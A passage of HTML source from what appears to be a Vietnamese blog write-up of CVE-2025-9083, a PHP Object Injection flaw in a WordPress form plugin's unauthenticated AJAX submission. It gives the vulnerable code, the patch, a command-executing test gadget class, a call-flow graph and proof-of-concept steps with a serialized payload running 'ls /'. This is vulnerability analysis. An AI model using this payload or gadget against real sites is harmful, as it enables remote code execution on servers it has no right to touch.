1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng xu·∫•t ph√°t t·ª´ h√†m &lt;code&gt;extractSubmissions()&lt;/code&gt; thu·ªôc file &lt;code&gt;FieldsetRepeater.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if(is_string($fieldSubmissionValue)){&#xA;    $fieldSubmissionValue = maybe_unserialize($fieldSubmissionValue);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;maybe_unserialize()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi nh∆∞ng kh√¥ng c√≥ c∆° ch·∫ø ch·ªëng l·∫°i t·∫•n c√¥ng PHP Object Injection&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/diff.png&#34; title=&#34;B·∫£n l·ªói v√† b·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;B·∫£n l·ªói v√† b·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/diff.png&#39; alt=&#34;Diff&#34; height=&#34;148&#34; width=&#34;1891&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;B·∫£n l·ªói v√† b·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° ƒë√£ s·ª≠ d·ª•ng &lt;code&gt;unserialize()&lt;/code&gt; thay v√¨ &lt;code&gt;maybe_unserialize()&lt;/code&gt;. Ch·∫∑n to√†n b·ªô vi·ªác t·∫°o object khi unserialize b·∫±ng &lt;code&gt;[&#39;allowed_classes&#39; =&amp;gt; false]&lt;/code&gt; =&amp;gt; NgƒÉn ch·∫∑n PHP Object Injection&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/class_name.png&#34; title=&#34;T√™n c·ªßa class&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/class_name.png&#34; data-sub-html=&#34;&lt;h2&gt;Class Name&lt;/h2&gt;&lt;p&gt;T√™n c·ªßa class&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/class_name.png&#39; alt=&#34;Class Name&#34; height=&#34;335&#34; width=&#34;1117&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;T√™n c·ªßa class&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;T√™n class t∆∞∆°ng ·ª©ng v·ªõi m·ªôt layout fields trong khi t·∫°o blank form b·∫±ng plugin&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/create_form.png&#34; title=&#34;T·∫°o form v·ªõi Repeatable Fieldset&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/create_form.png&#34; data-sub-html=&#34;&lt;h2&gt;Create Form&lt;/h2&gt;&lt;p&gt;T·∫°o form v·ªõi Repeatable Fieldset&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/create_form.png&#39; alt=&#34;Create Form&#34; height=&#34;782&#34; width=&#34;1915&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;T·∫°o form v·ªõi Repeatable Fieldset&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Th·ª≠ t·∫°o form v·ªõi &lt;strong&gt;Repeatable Fieldset&lt;/strong&gt; sau ƒë√≥ k√©o &lt;strong&gt;Single Line Text&lt;/strong&gt; v√†o &lt;strong&gt;Repeatable Fieldset&lt;/strong&gt; ƒë·ªÉ l√†m input, embed n√≥ v√†o post ho·∫∑c page&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/embed_form.png&#34; title=&#34;Th√™m form v√†o post&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/embed_form.png&#34; data-sub-html=&#34;&lt;h2&gt;Embed Form&lt;/h2&gt;&lt;p&gt;Th√™m form v√†o post&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/embed_form.png&#39; alt=&#34;Embed Form&#34; height=&#34;455&#34; width=&#34;1192&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Th√™m form v√†o post&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Public post v√† th·ª≠ submit form v·ªõi input l√† &lt;code&gt;payload&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/request1.png&#34; title=&#34;Request th·ª≠ v·ªõi `payload`&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/request1.png&#34; data-sub-html=&#34;&lt;h2&gt;Request&lt;/h2&gt;&lt;p&gt;Request th·ª≠ v·ªõi `payload`&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/request1.png&#39; alt=&#34;Request&#34; height=&#34;967&#34; width=&#34;1874&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Request th·ª≠ v·ªõi `payload`&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta th·∫•y to√†n b·ªô d·ªØ li·ªáu ƒë∆∞·ª£c g√°n v√†o param &lt;code&gt;formData&lt;/code&gt;, ta copy n·ªôi dung ƒë√£ ƒë∆∞·ª£c URL Decode v√†o ·ª©ng d·ª•ng format JSON online &lt;a href=&#34;https://jsonformatter.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://jsonformatter.org/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/format.png&#34; title=&#34;Data d·∫°ng JSON ƒë∆∞·ª£c format&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/format.png&#34; data-sub-html=&#34;&lt;h2&gt;Format&lt;/h2&gt;&lt;p&gt;Data d·∫°ng JSON ƒë∆∞·ª£c format&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/format.png&#39; alt=&#34;Format&#34; height=&#34;834&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Data d·∫°ng JSON ƒë∆∞·ª£c format&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Quan s√°t debugger ta th·∫•y s·ª± t∆∞∆°ng ƒë·ªìng ·ªü ƒë√¢y&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/debug1.png&#34; title=&#34;D·ªØ li·ªáu trong debugger&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/debug1.png&#34; data-sub-html=&#34;&lt;h2&gt;Debug&lt;/h2&gt;&lt;p&gt;D·ªØ li·ªáu trong debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/debug1.png&#39; alt=&#34;Debug&#34; height=&#34;331&#34; width=&#34;1596&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;D·ªØ li·ªáu trong debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$fieldSubmissionValue&lt;/code&gt; t∆∞∆°ng ·ª©ng v·ªõi &lt;code&gt;value&lt;/code&gt; trong field c√≥ id &lt;code&gt;8&lt;/code&gt;. Nh∆∞ v·∫≠y khi &lt;code&gt;value&lt;/code&gt; l√† chu·ªói th√¨ n√≥ s·∫Ω g·ªçi h√†m &lt;code&gt;maybe_unserialize()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta t·∫°o class v√† ƒë·∫∑t trong &lt;code&gt;wp-config.php&lt;/code&gt; ƒë·ªÉ test s·ª± ki·ªán k√≠ch ho·∫°t khi &lt;code&gt;maybe_unserialize()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class ObjectInjection&#xA;{&#xA;   public $command;&#xA;&#xA;   function __destruct(){&#xA;&#x9;&#x9;die(system($this-&amp;gt;command));&#xA;   }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;G·ª≠i l·∫°i request submit v·ªõi gi√° tr·ªã c·ªßa &lt;code&gt;value&lt;/code&gt; l√† chu·ªói serialize ch·ª©a payload. V√¨ bao b·ªçc b√™n ngo√†i l√† JSON n√™n khi truy·ªÅn chu·ªói c·∫ßn ph·∫£i ch√∫ √Ω escape &lt;code&gt;&amp;quot;&lt;/code&gt; th√†nh &lt;code&gt;\&amp;quot;&lt;/code&gt; ƒë·ªÉ tr√°nh g√¢y l·ªói.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/change_value.png&#34; title=&#34;Change gi√° tr·ªã c·ªßa value th√†nh chu·ªói serialize&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/change_value.png&#34; data-sub-html=&#34;&lt;h2&gt;Change Value&lt;/h2&gt;&lt;p&gt;Change gi√° tr·ªã c·ªßa value th√†nh chu·ªói serialize&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/change_value.png&#39; alt=&#34;Change Value&#34; height=&#34;843&#34; width=&#34;1917&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Change gi√° tr·ªã c·ªßa value th√†nh chu·ªói serialize&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/debug2.png&#34; title=&#34;Gi√° tr·ªã c·ªßa value trong debugger&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/debug2.png&#34; data-sub-html=&#34;&lt;h2&gt;Debug2&lt;/h2&gt;&lt;p&gt;Gi√° tr·ªã c·ªßa value trong debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/debug2.png&#39; alt=&#34;Debug2&#34; height=&#34;305&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Gi√° tr·ªã c·ªßa value trong debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Shell th·ª±c thi =&amp;gt; Deserialize ƒë∆∞·ª£c k√≠ch ho·∫°t.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/result.png&#34; title=&#34;Deserialize ƒë∆∞·ª£c k√≠ch ho·∫°t&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Deserialize ƒë∆∞·ª£c k√≠ch ho·∫°t&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/result.png&#39; alt=&#34;Result&#34; height=&#34;836&#34; width=&#34;1917&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Deserialize ƒë∆∞·ª£c k√≠ch ho·∫°t&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;Lu·ªìng g·ªçi h√†m c·ªßa callstack:&lt;/p&gt;&#xA;&lt;p&gt;·ª®ng d·ª•ng ƒë√£ ƒëƒÉng k√Ω m·ªôt ajax d√†nh cho Unauthenticated user&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if( isset( $_POST[&amp;#39;formData&amp;#39;] ) ) {&#xA;    $this-&amp;gt;_form_data = json_decode( $_POST[&amp;#39;formData&amp;#39;], TRUE  );&#xA;&#xA;    // php5.2 fallback&#xA;    if( ! $this-&amp;gt;_form_data ) $this-&amp;gt;_form_data = json_decode( stripslashes( $_POST[&amp;#39;formData&amp;#39;] ), TRUE  );&#xA;}&#xA;add_action( &amp;#39;wp_ajax_nopriv_nf_ajax_submit&amp;#39;,   array( $this, &amp;#39;submit&amp;#39; )  );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;T·ª©c khi g·ª≠i POST request ƒë·∫øn endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi param &lt;code&gt;action=nf_ajax_submit&lt;/code&gt; th√¨ callback &lt;code&gt;submit&lt;/code&gt; ƒë∆∞·ª£c g·ªçi&lt;/p&gt;&#xA;&lt;p&gt;Khi form ƒë∆∞·ª£c submit ƒë·∫ßy ƒë·ªß th√¨ n√≥ lu·ªìng g·ªçi h√†m s·∫Ω theo tr√¨nh t·ª± n√†y&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/callstack.png&#34; title=&#34;Lu·ªìng g·ªçi h√†m trong callstack&#34; data-thumbnail=&#34;/posts/2025-11-14-cve-2025-9083/callstack.png&#34; data-sub-html=&#34;&lt;h2&gt;Callstack&lt;/h2&gt;&lt;p&gt;Lu·ªìng g·ªçi h√†m trong callstack&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-14-cve-2025-9083/callstack.png&#39; alt=&#34;Callstack&#34; height=&#34;247&#34; width=&#34;682&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Lu·ªìng g·ªçi h√†m trong callstack&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;POST /wp-admin/admin-ajax.php&amp;#34;] -- action=nf_ajax_submit&amp;amp;security=security_code&amp;amp;formData=form_data --&amp;gt; B[&amp;#34;wp_ajax_nopriv_nf_ajax_submit&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;NF_AJAX_Controllers_Submission::submit()&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;NF_AJAX_Controllers_Submission::process()&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;NF_MergeTags_Fields::add_field()&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;NF_MergeTags_Fields::generateFieldsetTableRows()&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;NF_Handlers_FieldsetRepeater::extractSubmissions()&amp;#34;] --&amp;gt; H{$fieldSubmissionValue is String?}&#xA;H -- Yes --&amp;gt; I[&amp;#34;maybe_unserialize($fieldSubmissionValue)&amp;#34;]&#xA;I --&amp;gt; K(&amp;#34;RCE&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;S·ª≠ d·ª•ng plugin ƒë·ªÉ t·∫°o blank form v·ªõi &lt;code&gt;Single Line Text&lt;/code&gt; n·∫±m trong &lt;code&gt;Repeatable Fieldset&lt;/code&gt; v√† th√™m form v√†o post/page&lt;/li&gt;&#xA;&lt;li&gt;Submit form v√† cho request ƒëi qua Burp proxy&lt;/li&gt;&#xA;&lt;li&gt;S·ª≠a l·∫°i &lt;code&gt;value&lt;/code&gt; c·ªßa &lt;code&gt;field&lt;/code&gt; ch·ª©a chu·ªïi serialized thay th√¨ JSON&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#34;O:15:\&amp;#34;ObjectInjection\&amp;#34;:1:{s:7:\&amp;#34;command\&amp;#34;;s:4:\&amp;#34;ls /\&amp;#34;;}&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;G·ª≠i l·∫°i request&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;M·∫πo&lt;/p&gt;&lt;p&gt;ƒê·ªÉ test tr√™n local, ta t·∫°o class ch·ª©a magic method &lt;code&gt;__wakeup()&lt;/code&gt; s·∫Ω t·ª± k√≠ch ho·∫°t khi deserialized ƒë·∫∑t n√≥ trong &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class ObjectInjection&#xA;{&#xA;  public $command;&#xA;  function __destruct(){&#xA;  &#x9;die(system($this-&amp;gt;command));&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;L·ªó h·ªïng CVE-2025-9083 b·∫Øt ngu·ªìn t·ª´ vi·ªác s·ª≠ d·ª•ng &lt;code&gt;maybe_unserialize()&lt;/code&gt; tr√™n d·ªØ li·ªáu do ng∆∞·ªùi d√πng cung c·∫•p m√† kh√¥ng c√≥ b·∫•t k·ª≥ c∆° ch·∫ø ki·ªÉm so√°t ho·∫∑c h·∫°n ch·∫ø l·ªõp ƒë∆∞·ª£c unserialize. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c th·ª±c thi m√£ tu·ª≥ √Ω tr√™n h·ªá th·ªëng n·∫øu t√¨m ƒë∆∞·ª£c gadget ph√π h·ª£p trong WordPress ho·∫∑c plugin/theme kh√°c. B·∫£n v√° 3.11.1 ƒë√£ lo·∫°i b·ªè ho√†n to√†n kh·∫£ nƒÉng t·∫°o object b·∫±ng c√°ch s·ª≠ d·ª•ng &lt;code&gt;unserialize()&lt;/code&gt; v·ªõi t√πy ch·ªçn &lt;code&gt;[&#39;allowed_classes&#39; =&amp;gt; false]&lt;/code&gt;, gi√∫p ngƒÉn ch·∫∑n POI ·ªü t·∫ßng c∆° s·ªü.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;maybe_unserialize()&lt;/code&gt; c·ª±c k·ª≥ r·ªßi ro khi √°p d·ª•ng l√™n input c·ªßa ng∆∞·ªùi d√πng.&lt;/li&gt;&#xA;&lt;li&gt;Ch·ªâ c·∫ßn m·ªôt gadget t·ªìn t·∫°i trong m√£ ngu·ªìn l√† c√≥ th·ªÉ d·∫´n ƒë·∫øn Remote Code Execution.&lt;/li&gt;&#xA;&lt;li&gt;WordPress AJAX endpoints m·ªü cho unauthenticated user th∆∞·ªùng l√† ƒëi·ªÉm t·∫•n c√¥ng tr·ªçng y·∫øu.&lt;/li&gt;&#xA;&lt;li&gt;JSON embedding khi·∫øn payload serialize ph·∫£i escape c·∫©n th·∫≠n ƒë·ªÉ tr√°nh l·ªói.&lt;/li&gt;&#xA;&lt;li&gt;B·∫£n v√° 3.11.1 ch·ª©ng minh vi·ªác ki·ªÉm so√°t l·ªõp khi unserialize l√† bi·ªán ph√°p ph√≤ng th·ªß quan tr·ªçng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; 